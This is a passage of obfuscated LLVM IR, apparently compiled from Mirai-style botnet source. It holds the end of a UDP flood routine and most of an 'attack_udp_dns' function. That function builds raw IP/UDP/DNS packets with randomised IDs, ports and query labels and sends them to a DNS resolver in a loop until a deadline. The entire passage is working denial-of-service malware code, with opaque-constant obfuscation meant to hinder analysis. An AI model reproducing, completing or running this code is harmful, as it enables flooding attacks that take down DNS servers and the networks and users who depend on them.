  store i32 -1, i32* %210, align 4
  %211 = load i8*, i8** %25, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 4
  store i8* %212, i8** %25, align 8
  %213 = load i8*, i8** %25, align 8
  %214 = load i8*, i8** %20, align 8
  %215 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %213, i8* %214, i32 %215)
  br label %216

; <label>:216:                                    ; preds = %176
  %217 = load i32, i32* %11, align 4
  %218 = sub i32 %217, 498466650
  %219 = add i32 %218, 1
  %220 = add i32 %219, 498466650
  %221 = add nsw i32 %217, 1
  store i32 %220, i32* %11, align 4
  br label %80

; <label>:222:                                    ; preds = %80
  br label %223

; <label>:223:                                    ; preds = %363, %222
  store i32 0, i32* %11, align 4
  br label %224

; <label>:224:                                    ; preds = %351, %223
  %225 = load i32, i32* %11, align 4
  %226 = load i8, i8* %7, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp slt i32 %225, %227
  br i1 %228, label %229, label %357

; <label>:229:                                    ; preds = %224
  %230 = load i8**, i8*** %13, align 8
  %231 = load i32, i32* %11, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds i8*, i8** %230, i64 %232
  %234 = load i8*, i8** %233, align 8
  store i8* %234, i8** %26, align 8
  %235 = load i8*, i8** %26, align 8
  %236 = bitcast i8* %235 to %struct.iphdr*
  store %struct.iphdr* %236, %struct.iphdr** %27, align 8
  %237 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i64 1
  %239 = bitcast %struct.iphdr* %238 to %struct.udphdr*
  store %struct.udphdr* %239, %struct.udphdr** %28, align 8
  %240 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %241 = load i32, i32* %11, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 2
  %245 = load i8, i8* %244, align 4
  %246 = zext i8 %245 to i32
  %247 = icmp slt i32 %246, 32
  br i1 %247, label %248, label %272

; <label>:248:                                    ; preds = %229
  %249 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %250 = load i32, i32* %11, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i64 %251
  %253 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %252, i32 0, i32 1
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 %254) #7
  %256 = call i32 @rand_next()
  %257 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %258 = load i32, i32* %11, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i64 %259
  %261 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i32 0, i32 2
  %262 = load i8, i8* %261, align 4
  %263 = zext i8 %262 to i32
  %264 = lshr i32 %256, %263
  %265 = sub i32 %255, -1428949206
  %266 = add i32 %265, %264
  %267 = add i32 %266, -1428949206
  %268 = add i32 %255, %264
  %269 = call i32 @htonl(i32 %267) #7
  %270 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 9
  store i32 %269, i32* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %248, %229
  %273 = load i16, i16* %15, align 2
  %274 = zext i16 %273 to i32
  %275 = icmp eq i32 %274, 65535
  br i1 %275, label %276, label %281

; <label>:276:                                    ; preds = %272
  %277 = call i32 @rand_next()
  %278 = trunc i32 %277 to i16
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 3
  store i16 %278, i16* %280, align 4
  br label %281

; <label>:281:                                    ; preds = %276, %272
  %282 = load i16, i16* %18, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 0
  store i16 %287, i16* %289, align 2
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load i16, i16* %19, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %299

; <label>:294:                                    ; preds = %290
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 1
  store i16 %296, i16* %298, align 2
  br label %299

; <label>:299:                                    ; preds = %294, %290
  %300 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 7
  store i16 0, i16* %301, align 2
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = bitcast %struct.iphdr* %302 to i16*
  %304 = call zeroext i16 @checksum_generic(i16* %303, i32 20)
  %305 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 7
  store i16 %304, i16* %306, align 2
  %307 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 3
  store i16 0, i16* %308, align 2
  %309 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %310 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %311 = bitcast %struct.udphdr* %310 to i8*
  %312 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 2
  %314 = load i16, i16* %313, align 2
  %315 = load i32, i32* %21, align 4
  %316 = sext i32 %315 to i64
  %317 = sub i64 0, %316
  %318 = sub i64 12, %317
  %319 = add i64 12, %316
  %320 = trunc i64 %318 to i32
  %321 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %309, i8* %311, i16 zeroext %314, i32 %320)
  %322 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 2
  %324 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 1
  %326 = load i16, i16* %325, align 2
  %327 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %328 = load i32, i32* %11, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i32 0, i32 0
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %331, i32 0, i32 1
  store i16 %326, i16* %332, align 2
  %333 = load i32, i32* %12, align 4
  %334 = load i8*, i8** %26, align 8
  %335 = load i32, i32* %21, align 4
  %336 = sext i32 %335 to i64
  %337 = add i64 32, 8833134022901052934
  %338 = add i64 %337, %336
  %339 = sub i64 %338, 8833134022901052934
  %340 = add i64 32, %336
  %341 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %342 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %343 = load i32, i32* %11, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i64 %344
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %345, i32 0, i32 0
  %347 = bitcast %struct.sockaddr_in* %346 to %struct.sockaddr*
  store %struct.sockaddr* %347, %struct.sockaddr** %341, align 8
  %348 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %349 = load %struct.sockaddr*, %struct.sockaddr** %348, align 8
  %350 = call i64 @sendto(i32 %333, i8* %334, i64 %339, i32 16384, %struct.sockaddr* %349, i32 16)
  br label %351

; <label>:351:                                    ; preds = %299
  %352 = load i32, i32* %11, align 4
  %353 = add i32 %352, 1916689377
  %354 = add i32 %353, 1
  %355 = sub i32 %354, 1916689377
  %356 = add nsw i32 %352, 1
  store i32 %355, i32* %11, align 4
  br label %224

; <label>:357:                                    ; preds = %224
  %358 = call i64 @time(i64* null) #6
  %359 = load i32, i32* %22, align 4
  %360 = sext i32 %359 to i64
  %361 = icmp sgt i64 %358, %360
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %357
  br label %364

; <label>:363:                                    ; preds = %357
  br label %223

; <label>:364:                                    ; preds = %362, %76, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add i64 %81, 7253160535123970339
  %85 = add i64 %84, %83
  %86 = sub i64 %85, 7253160535123970339
  %87 = add nsw i64 %81, %83
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %25, align 4
  %89 = load i8*, i8** %22, align 8
  %90 = icmp eq i8* %89, null
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %5
  br label %528

; <label>:92:                                     ; preds = %5
  %93 = load i8*, i8** %22, align 8
  %94 = call i32 @util_strlen(i8* %93)
  store i32 %94, i32* %23, align 4
  %95 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %95, i32* %12, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %92
  br label %528

; <label>:98:                                     ; preds = %92
  store i32 1, i32* %11, align 4
  %99 = load i32, i32* %12, align 4
  %100 = bitcast i32* %11 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 0, i32 3, i8* %100, i32 4) #6
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  br label %528

; <label>:106:                                    ; preds = %98
  store i32 0, i32* %11, align 4
  br label %107

; <label>:107:                                    ; preds = %329, %106
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  br i1 %111, label %112, label %335

; <label>:112:                                    ; preds = %107
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %113 = call noalias i8* @calloc(i64 600, i64 1) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %29, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.udphdr*
  store %struct.udphdr* %126, %struct.udphdr** %30, align 8
  %127 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i64 1
  %129 = bitcast %struct.udphdr* %128 to %struct.dnshdr*
  store %struct.dnshdr* %129, %struct.dnshdr** %31, align 8
  %130 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %131 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %130, i64 1
  %132 = bitcast %struct.dnshdr* %131 to i8*
  store i8* %132, i8** %32, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = xor i8 15, -1
  %137 = xor i8 %135, %136
  %138 = and i8 %137, %135
  %139 = and i8 %135, 15
  %140 = xor i8 %138, -1
  %141 = xor i8 64, -1
  %142 = xor i8 -43, -1
  %143 = and i8 %140, -43
  %144 = and i8 %138, %142
  %145 = and i8 %141, -43
  %146 = and i8 64, %142
  %147 = or i8 %143, %144
  %148 = or i8 %145, %146
  %149 = xor i8 %147, %148
  %150 = or i8 %140, %141
  %151 = xor i8 %150, -1
  %152 = or i8 -43, %142
  %153 = and i8 %151, %152
  %154 = or i8 %149, %153
  %155 = or i8 %138, 64
  store i8 %154, i8* %134, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = load i8, i8* %157, align 4
  %159 = xor i8 %158, -1
  %160 = xor i8 -16, -1
  %161 = xor i8 53, -1
  %162 = or i8 %159, %160
  %163 = or i8 53, %161
  %164 = xor i8 %162, -1
  %165 = and i8 %164, %163
  %166 = and i8 %158, -16
  %167 = and i8 %165, 5
  %168 = xor i8 %165, 5
  %169 = or i8 %167, %168
  %170 = or i8 %165, 5
  store i8 %169, i8* %157, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 1
  store i8 %171, i8* %173, align 1
  %174 = load i8, i8* %21, align 1
  %175 = zext i8 %174 to i64
  %176 = sub i64 0, 41
  %177 = sub i64 0, %175
  %178 = add i64 %176, %177
  %179 = sub i64 0, %178
  %180 = add i64 41, %175
  %181 = sub i64 %179, -6794252208573681544
  %182 = add i64 %181, 2
  %183 = add i64 %182, -6794252208573681544
  %184 = add i64 %179, 2
  %185 = load i32, i32* %23, align 4
  %186 = sext i32 %185 to i64
  %187 = sub i64 0, %183
  %188 = sub i64 0, %186
  %189 = add i64 %187, %188
  %190 = sub i64 0, %189
  %191 = add i64 %183, %186
  %192 = add i64 %190, -6547394247666910408
  %193 = add i64 %192, 4
  %194 = sub i64 %193, -6547394247666910408
  %195 = add i64 %190, 4
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %15, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load i8, i8* %16, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 %204, i8* %206, align 4
  %207 = load i8, i8* %17, align 1
  %208 = icmp ne i8 %207, 0
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %112
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %209, %112
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 17, i8* %215, align 1
  %216 = load i32, i32* @LOCAL_ADDR, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load i32, i32* %24, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load i16, i16* %18, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 2
  %226 = load i16, i16* %19, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i8, i8* %21, align 1
  %231 = zext i8 %230 to i64
  %232 = sub i64 0, %231
  %233 = sub i64 21, %232
  %234 = add i64 21, %231
  %235 = sub i64 0, 2
  %236 = sub i64 %233, %235
  %237 = add i64 %233, 2
  %238 = load i32, i32* %23, align 4
  %239 = sext i32 %238 to i64
  %240 = sub i64 0, %239
  %241 = sub i64 %236, %240
  %242 = add i64 %236, %239
  %243 = sub i64 %241, 6510045202972535223
  %244 = add i64 %243, 4
  %245 = add i64 %244, 6510045202972535223
  %246 = add i64 %241, 4
  %247 = trunc i64 %245 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 2
  store i16 %248, i16* %250, align 2
  %251 = load i16, i16* %20, align 2
  %252 = call zeroext i16 @htons(i16 zeroext %251) #7
  %253 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %254 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  %255 = call zeroext i16 @htons(i16 zeroext 256) #7
  %256 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %257 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %256, i32 0, i32 1
  store i16 %255, i16* %257, align 2
  %258 = call zeroext i16 @htons(i16 zeroext 1) #7
  %259 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %260 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %259, i32 0, i32 2
  store i16 %258, i16* %260, align 2
  %261 = load i8, i8* %21, align 1
  %262 = load i8*, i8** %32, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %32, align 8
  store i8 %261, i8* %262, align 1
  %264 = load i8, i8* %21, align 1
  %265 = zext i8 %264 to i32
  %266 = load i8*, i8** %32, align 8
  %267 = sext i32 %265 to i64
  %268 = getelementptr inbounds i8, i8* %266, i64 %267
  store i8* %268, i8** %32, align 8
  %269 = load i8*, i8** %32, align 8
  store i8* %269, i8** %33, align 8
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i64 1
  %272 = load i8*, i8** %22, align 8
  %273 = load i32, i32* %23, align 4
  %274 = sub i32 0, %273
  %275 = sub i32 0, 1
  %276 = add i32 %274, %275
  %277 = sub i32 0, %276
  %278 = add nsw i32 %273, 1
  call void @util_memcpy(i8* %271, i8* %272, i32 %277)
  store i32 0, i32* %26, align 4
  br label %279

; <label>:279:                                    ; preds = %309, %213
  %280 = load i32, i32* %26, align 4
  %281 = load i32, i32* %23, align 4
  %282 = icmp slt i32 %280, %281
  br i1 %282, label %283, label %314

; <label>:283:                                    ; preds = %279
  %284 = load i8*, i8** %22, align 8
  %285 = load i32, i32* %26, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds i8, i8* %284, i64 %286
  %288 = load i8, i8* %287, align 1
  %289 = sext i8 %288 to i32
  %290 = icmp eq i32 %289, 46
  br i1 %290, label %291, label %303

; <label>:291:                                    ; preds = %283
  %292 = load i8, i8* %27, align 1
  %293 = load i8*, i8** %33, align 8
  store i8 %292, i8* %293, align 1
  store i8 0, i8* %27, align 1
  %294 = load i8, i8* %28, align 1
  %295 = sub i8 0, 1
  %296 = sub i8 %294, %295
  %297 = add i8 %294, 1
  store i8 %296, i8* %28, align 1
  %298 = load i8*, i8** %32, align 8
  %299 = load i32, i32* %26, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds i8, i8* %298, i64 %300
  %302 = getelementptr inbounds i8, i8* %301, i64 1
  store i8* %302, i8** %33, align 8
  br label %308

; <label>:303:                                    ; preds = %283
  %304 = load i8, i8* %27, align 1
  %305 = sub i8 0, 1
  %306 = sub i8 %304, %305
  %307 = add i8 %304, 1
  store i8 %306, i8* %27, align 1
  br label %308

; <label>:308:                                    ; preds = %303, %291
  br label %309

; <label>:309:                                    ; preds = %308
  %310 = load i32, i32* %26, align 4
  %311 = sub i32 0, 1
  %312 = sub i32 %310, %311
  %313 = add nsw i32 %310, 1
  store i32 %312, i32* %26, align 4
  br label %279

; <label>:314:                                    ; preds = %279
  %315 = load i8, i8* %27, align 1
  %316 = load i8*, i8** %33, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %32, align 8
  %318 = load i32, i32* %23, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %34, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  br label %329

; <label>:329:                                    ; preds = %314
  %330 = load i32, i32* %11, align 4
  %331 = sub i32 %330, 1344109317
  %332 = add i32 %331, 1
  %333 = add i32 %332, 1344109317
  %334 = add nsw i32 %330, 1
  store i32 %333, i32* %11, align 4
  br label %107

; <label>:335:                                    ; preds = %107
  br label %336

; <label>:336:                                    ; preds = %527, %335
  store i32 0, i32* %11, align 4
  br label %337

; <label>:337:                                    ; preds = %516, %336
  %338 = load i32, i32* %11, align 4
  %339 = load i8, i8* %7, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %521

; <label>:342:                                    ; preds = %337
  %343 = load i8**, i8*** %13, align 8
  %344 = load i32, i32* %11, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds i8*, i8** %343, i64 %345
  %347 = load i8*, i8** %346, align 8
  store i8* %347, i8** %35, align 8
  %348 = load i8*, i8** %35, align 8
  %349 = bitcast i8* %348 to %struct.iphdr*
  store %struct.iphdr* %349, %struct.iphdr** %36, align 8
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i64 1
  %352 = bitcast %struct.iphdr* %351 to %struct.udphdr*
  store %struct.udphdr* %352, %struct.udphdr** %37, align 8
  %353 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i64 1
  %355 = bitcast %struct.udphdr* %354 to %struct.dnshdr*
  store %struct.dnshdr* %355, %struct.dnshdr** %38, align 8
  %356 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %357 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %356, i64 1
  %358 = bitcast %struct.dnshdr* %357 to i8*
  %359 = getelementptr inbounds i8, i8* %358, i64 1
  store i8* %359, i8** %39, align 8
  %360 = load i16, i16* %15, align 2
  %361 = zext i16 %360 to i32
  %362 = icmp eq i32 %361, 65535
  br i1 %362, label %363, label %376

; <label>:363:                                    ; preds = %342
  %364 = call i32 @rand_next()
  %365 = xor i32 %364, -1
  %366 = xor i32 65535, -1
  %367 = xor i32 1369606284, -1
  %368 = or i32 %365, %366
  %369 = or i32 1369606284, %367
  %370 = xor i32 %368, -1
  %371 = and i32 %370, %369
  %372 = and i32 %364, 65535
  %373 = trunc i32 %371 to i16
  %374 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i32 0, i32 3
  store i16 %373, i16* %375, align 4
  br label %376

; <label>:376:                                    ; preds = %363, %342
  %377 = load i16, i16* %18, align 2
  %378 = zext i16 %377 to i32
  %379 = icmp eq i32 %378, 65535
  br i1 %379, label %380, label %389

; <label>:380:                                    ; preds = %376
  %381 = call i32 @rand_next()
  %382 = xor i32 65535, -1
  %383 = xor i32 %381, %382
  %384 = and i32 %383, %381
  %385 = and i32 %381, 65535
  %386 = trunc i32 %384 to i16
  %387 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %388 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %387, i32 0, i32 0
  store i16 %386, i16* %388, align 2
  br label %389

; <label>:389:                                    ; preds = %380, %376
